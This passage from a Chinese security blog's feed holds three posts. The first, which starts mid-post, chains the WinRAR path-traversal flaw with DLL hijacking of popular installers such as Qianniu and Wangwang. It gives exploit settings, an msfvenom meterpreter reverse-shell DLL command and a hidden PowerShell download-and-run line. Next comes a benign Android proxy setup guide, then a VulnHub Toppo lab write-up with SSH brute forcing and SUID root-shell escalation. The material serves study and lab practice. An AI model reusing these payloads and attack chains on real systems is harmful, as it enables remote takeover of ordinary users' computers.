rel="noopener">倾旋的博客</a></li><li>因为WinRAR这个跨文件目录释放的漏洞本来就不怎么容易利用，而且DLL劫持也需要知道别人电脑里有什么软件，还得知道别人装的软件哪里存在DLL劫持。这真的是难上加难了。所以下面的思路仅供脑补，会有很多很多假设。</li><li>既然我们不知道目标主机上有什么软件，那就要找一个比较通用的DLL，然后发现很多安装包程序就存在很多DLL劫持漏洞，在测试时发现了阿里几个客户端都存在DLL劫持，甚至连我想安装的火绒杀毒软件也存在同样的问题。那我就推测是不是打包成安装包的工具有问题。</li><li><p>下面是我测试安装包，存在DLL劫持的，我只是测试了几个，这么巧，这几个都存在DLL劫持。</p></li><li><p>旺旺客户端的</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\CRYPTBASE.dll</span><br><span class="line">C:\Windows\system32\WindowsCodecs.dll</span><br><span class="line">C:\Windows\system32\SspiCli.dll</span><br><span class="line">C:\Windows\system32\dwmapi.dll</span><br><span class="line">C:\Windows\system32\ntmarta.dll</span><br><span class="line">C:\Windows\system32\dnsapi.DLL</span><br><span class="line">C:\Windows\system32\iphlpapi.DLL</span><br><span class="line">C:\Windows\system32\RASAPI32.dll</span><br><span class="line">C:\Windows\system32\rtutils.dll</span><br><span class="line">C:\Windows\system32\sensapi.dll</span><br><span class="line">C:\Windows\system32\rasadhlp.dll</span><br><span class="line">C:\Windows\system32\VERSION.dll</span><br></pre></td></tr></table></figure><ul><li>千牛客户端的</li></ul><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\C</span>RYPTBASE.dll</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\S</span>HFOLDER.DLL</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\n</span>tmarta.dll</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\d</span>wmapi.dll</span><br></pre></td></tr></table></figure><ul><li>钉钉还有火绒也差不多和上面的一样，但是在测试时卡死了N次</li><li>在测试了上面几个安装包后统计出来一个特点，你会发现DLL全部是大写字母的，非常的通用，SHFOLDER.DLL可以支持三个安装包的劫持效果。旺旺的可以使用RASAPI32.dll。</li><li>释放到下载目录的部分代码。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The archive filename you want</span></span><br><span class="line">rar_filename = <span class="string">"test.rar"</span></span><br><span class="line"><span class="comment"># The evil file you want to run</span></span><br><span class="line">evil_filename = <span class="string">"WinRAR.dll"</span></span><br><span class="line"><span class="comment"># The decompression path you want, such shown below</span></span><br><span class="line">target_filename = <span class="string">r"C:\C:C:../Downloads\SHFOLDER.dll"</span></span><br><span class="line"><span class="comment"># Other files to be displayed when the victim opens the winrar</span></span><br><span class="line"><span class="comment"># filename_list=[]</span></span><br><span class="line">filename_list = [<span class="string">"hello.txt"</span>, <span class="string">"world.txt"</span>]</span><br></pre></td></tr></table></figure><ul><li>而且这些安装包会在一个比较固定的目录，那就是下载文件夹。假设我利用WinRAR的跨目录释放了一个DLL到了下载文件夹这个目录，然后用户从上面这些客户端的安装包官方网站下载的正常文件回来，下载完了直接点击打开运行，这样就会加载我释放出来的DLL，达到攻击的目的。</li><li>下面图片中是千牛客户端的安装包加载下载目录中的DLL后打开了计算器，在模块列表中看到是加载了攻击者的DLL。</li></ul><p><img src="/home/kali-team/MEGAsync/Blog/source/_posts/WinRAR代码执行复现与利用.assets/1551677406891.png" alt="1551677406891"></p><ul><li>下面开始演示一次，工具：一个DLL文件。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LPORT=7788 LHOST=192.168.56.1 -a x86 -f dll &gt;WinRAR.dll</span><br></pre></td></tr></table></figure><ul><li>MSF生成一个DLL有一个问题劫持了之后安装包不能正常运行，这是DLL的问题，自己写的应该就不会了。</li><li>或者使用CobaltStrike生成的DLL可以正常安装，但是要做好进程迁移，因为安装包结束了，子进程也会跟着关闭，这样就控制不了了，免杀是硬伤。。。</li></ul><h2 id="投放LNK文件"><a href="#投放LNK文件" class="headerlink" title="投放LNK文件"></a>投放LNK文件</h2><ul><li>只是一个思路：在CobaltStrike里使用PowerShell远程加载。</li></ul><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\W</span>indowsPowerShell<span class="symbol">\v</span>1.0<span class="symbol">\p</span>owershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.109:80/a'))"</span><br></pre></td></tr></table></figure><ul><li>关键是没几个人会点了，一般弄一个常见的快捷键什么都会被杀毒软件拦截。这个方法就算凑个数吧。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder" target="_blank" rel="noopener">https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder</a></p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Genymotion设置代理至BurpSuite和Charles</title>
      <link href="/2019/02/14/Genymotion%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%87%B3BurpSuite%E5%92%8CCharles/"/>
      <url>/2019/02/14/Genymotion%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%87%B3BurpSuite%E5%92%8CCharles/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ol><li><p>Genymotion</p></li><li><p>VirtualBox</p></li><li>BurpSuite</li><li>Charles</li></ol><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><a id="more"></a><ol><li>怎么下载安装就不用说了，因为genymotion要依赖VirtualBox，所以要先把VirtualBox装好。注册好genymotion的账号，SDK选默认的，网络设置先不要动，安装Android的镜像，开机！</li></ol><h2 id="设置Android代理"><a href="#设置Android代理" class="headerlink" title="设置Android代理"></a>设置Android代理</h2><ol><li>进入Android系统里面，打开设置-WiFi-鼠标按住WiredSSID两秒-点Modify network</li><li>把高级选项勾上，Proxy选Manual，Proxy hostname填你使用VirtualBox的那张网卡的IP，端口就是你代理工具监听的端口，默认8080。</li><li>如果不行就填这个Genymotion的内置IP：10.0.3.2</li></ol><h2 id="设置BurpSuite代理"><a href="#设置BurpSuite代理" class="headerlink" title="设置BurpSuite代理"></a>设置BurpSuite代理</h2><ol><li>在Proxy-Option的Proxy Listeners下面点Add添加一个监听服务，IP填VirtualBox的那张网卡的IP，端口填你上面设置的端口。</li><li>在Android打开任意网站测试流量是否通过了代理工具。</li></ol><h2 id="添加SSL证书支持"><a href="#添加SSL证书支持" class="headerlink" title="添加SSL证书支持"></a>添加SSL证书支持</h2><ol><li>如果在Android上访问https协议的网页会一直弹出提示证书不安全。so</li><li>先在BurpSuite导出CA证书，在BurpSuite刚刚添加代理服务的下面点击Import/export CA certificate，在导出DER格式的证书，下一步，保存到后缀名为cer的文件，拖到Android里，或者直接在Android的浏览器上输入<code>http://burp/</code>下载CA证书到Android本地，不过下载完要改后缀名为<strong>CER</strong>或者<strong>CRT</strong>。</li><li>在Android里打开设置，点击（Security）安全，（Install from SD card）从SD卡里安装证书，打开刚才拖进的文件随便起一个名字就可以了，再设置一个密码，要不要在任务通知栏显示看自己喜欢。</li><li>现在在去抓https协议就不会弹框警告了，当然也可以抓到APP的。</li></ol><h2 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h2><ol><li>设置在菜单Help里找到SSL Proxying –&gt;Save Charles Root Certificate,文件格式选<strong>CER</strong>。安装到Android，在Charles里选中HOST右键单击Enable SSl Proxying，就可以抓这个网站了。</li><li>或者点菜单上面的那个使用远程安装证书，浏览器打开<code>http://chls.pro/ssl</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Genymotion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-up-Toppo</title>
      <link href="/2018/10/30/Write-up-Toppo/"/>
      <url>/2018/10/30/Write-up-Toppo/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li><p>下载地址：<a href="https://download.vulnhub.com/toppo/Toppo.zip" target="_blank" rel="noopener">点我</a></p></li><li><p>哔哩哔哩：<a href="https://www.bilibili.com/video/av35092800/" target="_blank" rel="noopener">哔哩哔哩</a></p></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>vmnet8网卡，IP：192.168.131.144，开放web，ssh服务</li></ul><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vmnet8 </span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.131.1/24 brd 192.168.131.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~ nmap -sn 192.168.131.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 19:46 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.1</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.144</span><br><span class="line">Host is up (0.00093s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 3.08 seconds</span><br><span class="line">➜  ~ nmap -T4 -A 192.168.131.144</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 20:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.144</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)</span><br><span class="line">|   2048 89:99:c4:54:9a:18:66:f7:<span class="built_in">cd</span>:8e:ab:b6:aa:31:2e:c6 (RSA)</span><br><span class="line">|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)</span><br><span class="line">|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Clean Blog - Start Bootstrap Theme</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          41760/udp  status</span><br><span class="line">|_  100024  1          44661/tcp  status</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.36 seconds</span><br></pre></td></tr></table></figure><ul><li>nikto发现了admin目录还有一个mail目录。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto -h http://192.168.131.144/</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.131.144</span><br><span class="line">+ Target Hostname:    192.168.131.144</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2018-10-30 20:04:51 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.10 (Debian)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">'-C all'</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ OSVDB-3268: /admin/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /admin/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /img/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /img/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /mail/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /mail/: This might be interesting...</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /manual/images/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2018-10-30 20:05:10 (GMT8) (19 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><ul><li>admin目录里有一个notes.txt文件，这是他以前的密码:/ 12345ted123。而且提到了技术，钓鱼和足球。社工有用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.131.144/admin/notes.txt</span><br><span class="line">Note to myself :</span><br><span class="line"></span><br><span class="line">I need to change my password :/ 12345ted123 is too outdated but the technology isn<span class="string">'t my thing i prefer go fishing or watching soccer .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">➜  ~</span></span><br></pre></td></tr></table></figure><h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><ul><li>生成字典爆破ssh，用户名ted，别问我怎么知道的全网都是猜出来的，只能说出题人没给太多的提示，直觉。</li><li>hydra爆破得到密码为12345ted123</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  pydictor git:(master) ✗ python pydictor.py -plug scratch http://192.168.131.144/admin/notes.txt</span><br><span class="line">                              _ _      _</span><br><span class="line">              _ __  _   _  __| (_) ___| |_ ___  _ __</span><br><span class="line">             | <span class="string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__|</span><br><span class="line">             | |_) | |_| | (_| | | (__| || (_) | |</span><br><span class="line">             | .__/ \__, |\__,_|_|\___|\__\___/|_|</span><br><span class="line">             |_|    |___/                            2.1.1<span class="comment">#dev</span></span><br><span class="line"></span><br><span class="line">[+] A total of :11 lines</span><br><span class="line">[+] Store <span class="keyword">in</span>   :/home/kali-team/Kali-Team/password-recovery/pydictor/results/scratch_214601.txt </span><br><span class="line">[+] Cost       :0.0451 seconds</span><br><span class="line">➜  pydictor git:(master) ✗ cat results/scratch_214601.txt </span><br><span class="line">myself</span><br><span class="line">password</span><br><span class="line">12345ted123</span><br><span class="line">outdated</span><br><span class="line">technology</span><br><span class="line">thing</span><br><span class="line">prefer</span><br><span class="line">fishing</span><br><span class="line">watching</span><br><span class="line">soccer</span><br><span class="line">admin</span><br><span class="line"></span><br><span class="line">➜  ~ hydra -l ted -P Kali-Team/password-recovery/pydictor/results/scratch_215638.txt ssh://192.168.131.144</span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-30 21:57:18</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.131.144:22/</span><br><span class="line">[22][ssh] host: 192.168.131.144   login: ted   password: 12345ted123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-30 21:57:21</span><br></pre></td></tr></table></figure><h3 id="提权GetFlag"><a href="#提权GetFlag" class="headerlink" title="提权GetFlag"></a>提权GetFlag</h3><ul><li>找开启了SUID权限的应用</li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ted@<span class="symbol">Toppo:</span>~$ id</span><br><span class="line">uid=<span class="number">1000</span>(ted) gid=<span class="number">1000</span>(ted) groups=<span class="number">1000</span>(ted),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">108</span>(netdev),<span class="number">114</span>(bluetooth)</span><br><span class="line">ted@<span class="symbol">Toppo:</span>~$ find / -perm -u=s -<span class="keyword">type</span> f <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">eject</span>/<span class="title">dmcrypt</span>-<span class="title">get</span>-<span class="title">device</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">dbus</span>-1.0/<span class="title">dbus</span>-<span class="title">daemon</span>-<span class="title">launch</span>-<span class="title">helper</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">openssh</span>/<span class="title">ssh</span>-<span class="title">keysign</span></span></span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/python2.<span class="number">7</span></span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mawk</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure><ul><li>找不用root密码就可以用sudo的应用，发现mawk，和Python2.7都不用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ cat /etc/sudoers </span><br><span class="line">ted ALL=(ALL) NOPASSWD: /usr/bin/awk</span><br><span class="line"></span><br><span class="line">ted@Toppo:~$</span><br></pre></td></tr></table></figure><ul><li><ol><li>py,</li><li>mawk</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:/bin$ python -c <span class="string">'import pty;pty.spawn("/bin/sh")'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"></span><br><span class="line">ted@Toppo:/bin$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">ted@Toppo:/bin$ mawk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /root/flag.txt</span></span><br><span class="line">_________                                  </span><br><span class="line">|  _   _  |                                 </span><br><span class="line">|_/ | | \_|.--.   _ .--.   _ .--.    .--.   </span><br><span class="line">    | |  / .<span class="string">'`\ \[ '</span>/<span class="string">'`\ \[ '</span>/<span class="string">'`\ \/ .'</span>`\ \ </span><br><span class="line">   _| |_ | \__. | | \__/ | | \__/ || \__. | </span><br><span class="line">  |_____| <span class="string">'.__.'</span>  | ;.__/  | ;.__/  <span class="string">'.__.'</span>  </span><br><span class="line">                 [__|     [__|              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations ! there is your flag : 0wnedlab&#123;p4ssi0n_c0me_with_pract1ce&#125;</span><br></pre></td></tr></table></figure><h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><ul><li>在测试过程中我发现，Python有root权限，执行bash和执行dash返回的权限不一样，bash返回的是普通权限，而dash返回的是root权限。发了三次朋友圈求助终于明白了。其实bash加参数-p使用Posix模式也可以获取root权限。这里接触到了一个新的知识是POSIX 1003.2规范的标准，有兴趣的可以去搜索一下。我就不在这扯了。估计能写几页。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/bash -p")'</span></span><br><span class="line">bash-4.3<span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">bash-4.3<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/bash")'</span></span><br><span class="line">bash-4.3$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">bash-4.3$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/dash")'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">root      1926  0.0  1.0  10988  5420 ?        Ss   11:05   0:00  \_ sshd: ted [priv]    </span><br><span class="line">ted       1928  0.0  0.7  10988  4088 ?        S    11:05   0:00      \_ sshd: ted@pts/0     </span><br><span class="line">ted       1929  0.0  0.8   6376  4288 pts/0    Ss   11:05   0:00          \_ -bash</span><br><span class="line">root      2011  0.0  1.1   9816  6120 pts/0    S+   11:13   0:00              \_ python -c import pty;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">ted       2012  0.0  0.6   5448  3528 pts/1    Ss   11:13   0:00                  \_ /bin/bash</span><br><span class="line">ted       2013  0.0  0.4   4768  2548 pts/1    R+   11:13   0:00                      \_ ps aux f</span><br><span class="line">root      1926  0.0  1.0  10988  5420 ?        Ss   11:05   0:00  \_ sshd: ted [priv]    </span><br><span class="line">ted       1928  0.0  0.7  10988  4084 ?        S    11:05   0:00      \_ sshd: ted@pts/0     </span><br><span class="line">ted       1929  0.0  0.8   6376  4288 pts/0    Ss   11:05   0:00          \_ -bash</span><br><span class="line">root      1998  0.0  1.1   9816  6012 pts/0    S+   11:11   0:00              \_ python -c import pty;pty.spawn(<span class="string">"/bin/dash"</span>)</span><br><span class="line">root      1999  0.0  0.2   2272  1380 pts/1    Ss   11:11   0:00                  \_ /bin/dash</span><br><span class="line">root      2001  0.0  0.4   4768  2416 pts/1    R+   11:12   0:00                      